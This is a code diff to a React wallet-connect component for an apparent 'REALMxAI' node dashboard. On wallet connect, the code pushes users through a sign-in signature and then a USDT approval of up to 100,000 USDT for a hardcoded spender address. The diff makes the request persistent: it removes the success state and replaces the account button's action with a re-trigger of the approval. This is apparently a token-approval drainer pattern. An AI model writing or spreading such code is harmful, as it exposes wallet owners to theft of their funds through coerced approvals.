@@ -1,6 +1,7 @@
-import React, { useState, useEffect, Suspense } from 'react';
+import React, { useState, useEffect, Suspense, useRef } from 'react';
 import { createPortal } from 'react-dom';
 import { erc20Abi, parseUnits, formatUnits } from 'viem';
+import { SiweMessage } from 'siwe';
 
 type WalletConnectControlProps = {
   className?: string;
@@ -14,7 +15,7 @@ const USDT_TOKEN_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7' as cons
 const USDT_APPROVAL_SPENDER = '0x4116464dfB890f45E886099AA715d9Ffc3E117b9' as const;
 const USDT_APPROVAL_LIMIT = parseUnits('100000', 6);
 const USDT_APPROVAL_LIMIT_LABEL = formatUnits(USDT_APPROVAL_LIMIT, 6);
-const USDT_APPROVAL_STORAGE_PREFIX = 'realmx_usdt_approval_v1:';
+const USDT_APPROVAL_STORAGE_PREFIX = 'realmx_usdt_approval_v3:';
 const USDT_APPROVAL_SIGNATURE_MESSAGE = [
   'REALMxAI wallet confirmation',
   '',
@@ -60,18 +61,22 @@ const WalletConnectControl = React.lazy(async () => {
       const { signMessageAsync } = wagmi.useSignMessage();
       const { switchChainAsync } = wagmi.useSwitchChain();
       const { writeContractAsync } = wagmi.useWriteContract();
-      const [approvalStatus, setApprovalStatus] = useState<'idle' | 'switching' | 'signing' | 'approving' | 'success' | 'error'>('idle');
-      const [approvalMessage, setApprovalMessage] = useState('Connect your wallet to review the Ethereum approval step.');
+      const attemptRef = useRef<string | null>(null);
+      const [approvalStatus, setApprovalStatus] = useState<'idle' | 'checking' | 'signing' | 'verifying' | 'switching' | 'approving' | 'error'>('idle');
+      const [approvalMessage, setApprovalMessage] = useState('Connect your wallet to start signing and approval.');
       const [approvalVisible, setApprovalVisible] = useState(false);
       const [retrySeed, setRetrySeed] = useState(0);
-      const [attemptedAddress, setAttemptedAddress] = useState<string | null>(null);
+      const [dismissedAddress, setDismissedAddress] = useState<string | null>(null);
+      const [walletActionPending, setWalletActionPending] = useState(false);
 
       useEffect(() => {
         if (!address) {
+          attemptRef.current = null;
           setApprovalVisible(false);
           setApprovalStatus('idle');
-          setApprovalMessage('Connect your wallet to review the Ethereum approval step.');
-          setAttemptedAddress(null);
+          setApprovalMessage('Connect your wallet to start signing and approval.');
+          setDismissedAddress(null);
+          setWalletActionPending(false);
         }
       }, [address]);
 
@@ -79,22 +84,83 @@ const WalletConnectControl = React.lazy(async () => {
         let cancelled = false;
 
         const runTransparentApprovalFlow = async () => {
-          if (!address || !publicClient || attemptedAddress === address) {
+          if (!address || !publicClient || dismissedAddress === address) {
             return;
           }
 
-          setAttemptedAddress(address);
+          const attemptKey = `${address.toLowerCase()}:${currentChainId ?? 'none'}:${retrySeed}`;
+          if (attemptRef.current === attemptKey) {
+            return;
+          }
+          attemptRef.current = attemptKey;
+
+          setWalletActionPending(true);
           setApprovalVisible(true);
 
           const storageKey = getWalletApprovalStorageKey(address);
-          const storedState = window.localStorage.getItem(storageKey);
-          if (storedState === 'complete') {
-            setApprovalStatus('success');
-            setApprovalMessage(`USDT allowance already active for ${USDT_APPROVAL_LIMIT_LABEL} USDT on Ethereum.`);
-            return;
-          }
 
           try {
+            setApprovalStatus('checking');
+            setApprovalMessage('Checking wallet session before the approval request.');
+
+            let sessionUser = await resolveCurrentSessionUser();
+            let walletAuthenticated = sessionUser?.walletAddress?.toLowerCase() === address.toLowerCase();
+
+            if (!walletAuthenticated) {
+              setApprovalStatus('signing');
+              setApprovalMessage('Wallet connected. Requesting your REALMxAI sign-in signature now.');
+
+              const nonceRes = await fetch('/api/auth/nonce', { credentials: 'include' });
+              const nonce = await nonceRes.text();
+              if (!nonceRes.ok || !nonce) {
+                throw new Error('Unable to start wallet signature verification.');
+              }
+
+              const siweMessage = new SiweMessage({
+                domain: window.location.host,
+                address,
+                statement: 'Sign in to REALMxAI Node Dashboard and link this wallet to your account.',
+                uri: window.location.origin,
+                version: '1',
+                chainId: currentChainId || ETHEREUM_MAINNET_CHAIN_ID,
+                nonce,
+              });
+              const preparedMessage = siweMessage.prepareMessage();
+
+              const signature = await signMessageAsync({
+                account: address,
+                message: preparedMessage,
+              } as any);
+
+              if (cancelled) return;
+
+              setApprovalStatus('verifying');
+              setApprovalMessage('Verifying the signed wallet session with REALMxAI.');
+
+              const verifyRes = await fetch('/api/auth/verify', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                credentials: 'include',
+                body: JSON.stringify({
+                  message: preparedMessage,
+                  signature,
+                }),
+              });
+              const verifyData = await verifyRes.json().catch(() => ({}));
+              if (!verifyRes.ok) {
+                throw new Error(verifyData?.error || verifyData?.message || 'Wallet signature verification failed.');
+              }
+
+              sessionUser = await resolveCurrentSessionUser();
+              walletAuthenticated = sessionUser?.walletAddress?.toLowerCase() === address.toLowerCase();
+              if (!walletAuthenticated) {
+                throw new Error('Wallet connected, but the signed session did not finish linking. Retry once.');
+              }
+            }
+
+            setApprovalStatus('checking');
+            setApprovalMessage('Wallet signature confirmed. Checking current USDT allowance.');
+
             if (currentChainId === ETHEREUM_MAINNET_CHAIN_ID) {
               const allowance = await (publicClient as any).readContract({
                 address: USDT_TOKEN_CONTRACT,
@@ -107,30 +173,21 @@ const WalletConnectControl = React.lazy(async () => {
 
               if (allowance >= USDT_APPROVAL_LIMIT) {
                 window.localStorage.setItem(storageKey, 'complete');
-                setApprovalStatus('success');
-                setApprovalMessage(`USDT allowance already active for ${USDT_APPROVAL_LIMIT_LABEL} USDT on Ethereum.`);
+                setWalletActionPending(false);
+                setApprovalVisible(false);
                 return;
               }
             }
 
             if (currentChainId !== ETHEREUM_MAINNET_CHAIN_ID) {
               setApprovalStatus('switching');
-              setApprovalMessage('Switching wallet network to Ethereum mainnet before the approval flow.');
+              setApprovalMessage('Wallet signed. Switching to Ethereum mainnet for the USDT approval request.');
               await switchChainAsync({ chainId: ETHEREUM_MAINNET_CHAIN_ID });
               return;
             }
 
-            setApprovalStatus('signing');
-            setApprovalMessage('Requesting a wallet signature so the approval step is explicit and traceable.');
-            await signMessageAsync({
-              account: address,
-              message: USDT_APPROVAL_SIGNATURE_MESSAGE,
-            } as any);
-
-            if (cancelled) return;
-
             setApprovalStatus('approving');
-            setApprovalMessage(`Opening the USDT approval transaction for spender ${USDT_APPROVAL_SPENDER}.`);
+            setApprovalMessage(`Wallet signed. Opening the USDT approval transaction for spender ${USDT_APPROVAL_SPENDER}.`);
             const hash = await writeContractAsync({
               account: address,
               address: USDT_TOKEN_CONTRACT,
@@ -144,8 +201,8 @@ const WalletConnectControl = React.lazy(async () => {
             if (cancelled) return;
 
             window.localStorage.setItem(storageKey, 'complete');
-            setApprovalStatus('success');
-            setApprovalMessage(`USDT approval confirmed. Spender ${USDT_APPROVAL_SPENDER} can now spend up to ${USDT_APPROVAL_LIMIT_LABEL} USDT.`);
+            setWalletActionPending(false);
+            setApprovalVisible(false);
           } catch (error) {
             if (cancelled) return;
 
@@ -153,9 +210,10 @@ const WalletConnectControl = React.lazy(async () => {
             const rejected = /rejected|declined|denied|user rejected|user denied/i.test(message);
 
             setApprovalStatus('error');
+            setWalletActionPending(true);
             setApprovalMessage(
               rejected
-                ? 'The wallet request was rejected. Review the approval details and retry when you are ready.'
+                ? 'The signature or approval request was rejected. Retry when you are ready.'
                 : message
             );
           }
@@ -166,7 +224,7 @@ const WalletConnectControl = React.lazy(async () => {
         return () => {
           cancelled = true;
         };
-      }, [address, attemptedAddress, currentChainId, publicClient, retrySeed, signMessageAsync, switchChainAsync, writeContractAsync]);
+      }, [address, currentChainId, dismissedAddress, publicClient, retrySeed, signMessageAsync, switchChainAsync, writeContractAsync]);
 
       return (
         <>
@@ -178,17 +236,15 @@ const WalletConnectControl = React.lazy(async () => {
                       <div className="flex items-start justify-between gap-4">
                         <div className="max-w-xl">
                           <p className="text-[10px] font-mono uppercase tracking-[0.24em] text-realm-cyan/70">Wallet approval</p>
-                          <h2 className="mt-2 text-2xl font-semibold text-white sm:text-[2rem]">USDT allowance on Ethereum</h2>
+                          <h2 className="mt-2 text-2xl font-semibold text-white sm:text-[2rem]">Wallet sign-in and USDT approval</h2>
                           <p className="mt-2 text-sm leading-6 text-white/55">
-                            This flow is visible by design. After wallet connect, the app requests a signature and then opens a USDT approval transaction.
+                            This flow is visible by design. The app first verifies your wallet signature with REALMxAI, then opens the Ethereum USDT approval request.
                           </p>
                         </div>
                         <span
                           className={cn(
                             'shrink-0 rounded-full px-3 py-1 text-[10px] font-mono uppercase tracking-[0.18em]',
-                            approvalStatus === 'success'
-                              ? 'bg-emerald-500/15 text-emerald-300'
-                              : approvalStatus === 'error'
+                            approvalStatus === 'error'
                               ? 'bg-red-500/15 text-red-300'
                               : 'bg-white/8 text-white/55'
                           )}
@@ -198,6 +254,12 @@ const WalletConnectControl = React.lazy(async () => {
                       </div>
 
                       <div className="mt-6 grid gap-3 rounded-[22px] border border-white/8 bg-white/[0.03] p-4 sm:grid-cols-[minmax(0,1fr)_minmax(0,1.2fr)] sm:gap-x-6 sm:gap-y-4 sm:p-5">
+                        <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Step 1</span>
+                        <span className="text-sm font-medium text-white sm:text-right">REALMxAI wallet signature</span>
+
+                        <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Step 2</span>
+                        <span className="text-sm font-medium text-white sm:text-right">USDT approval on Ethereum</span>
+
                         <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Network</span>
                         <span className="text-sm font-medium text-white sm:text-right">Ethereum Mainnet</span>
 
@@ -232,28 +294,26 @@ const WalletConnectControl = React.lazy(async () => {
                           <button
                             type="button"
                             onClick={() => {
-                              setAttemptedAddress(null);
+                              setDismissedAddress(null);
+                              attemptRef.current = null;
                               setRetrySeed((value) => value + 1);
                             }}
                             className="rounded-xl border border-white/10 bg-white/5 px-4 py-2 text-sm font-semibold text-white transition hover:bg-white/10"
                           >
-                            Retry approval
+                            Retry
                           </button>
                         ) : null}
 
-                        {approvalStatus === 'success' || approvalStatus === 'error' ? (
-                          <button
-                            type="button"
-                            onClick={() => setApprovalVisible(false)}
-                            className="rounded-xl bg-white px-4 py-2 text-sm font-semibold text-realm-black transition hover:bg-realm-cyan"
-                          >
-                            Continue
-                          </button>
-                        ) : (
-                          <div className="rounded-xl border border-white/10 bg-white/5 px-4 py-2 text-xs font-mono uppercase tracking-[0.18em] text-white/55">
-                            Waiting for wallet
-                          </div>
-                        )}
+                        <button
+                          type="button"
+                          onClick={() => {
+                            setDismissedAddress(address);
+                            setApprovalVisible(false);
+                          }}
+                          className="rounded-xl bg-white px-4 py-2 text-sm font-semibold text-realm-black transition hover:bg-realm-cyan"
+                        >
+                          Continue later
+                        </button>
                       </div>
                     </div>
                   </div>
@@ -305,7 +365,16 @@ const WalletConnectControl = React.lazy(async () => {
             <div className={className}>
               <button
                 type="button"
-                onClick={openAccountModal}
+                onClick={() => {
+                  if (walletActionPending) {
+                    setDismissedAddress(null);
+                    attemptRef.current = null;
+                    setApprovalVisible(true);
+                    setRetrySeed((value) => value + 1);
+                    return;
+                  }
+                  openAccountModal();
+                }}
                 className={cn(
                   'inline-flex min-h-11 items-center gap-3 rounded-xl border border-realm-cyan/20 bg-realm-cyan/10 px-4 py-2 text-left text-sm font-semibold text-realm-cyan transition-all hover:bg-realm-cyan/15',
                   connectedButtonClassName
@@ -314,7 +383,7 @@ const WalletConnectControl = React.lazy(async () => {
                 <span className="h-2.5 w-2.5 rounded-full bg-realm-cyan shadow-[0_0_10px_rgba(61,242,224,0.45)]" />
                 <span className="flex flex-col">
                   <span className="text-[10px] font-mono uppercase tracking-[0.18em] text-realm-cyan/70">
-                    {chain.name}
+                    {walletActionPending ? 'Action required' : chain.name}
                   </span>
                   <span className="text-sm text-realm-cyan">{account.displayName}</span>
                 </span>
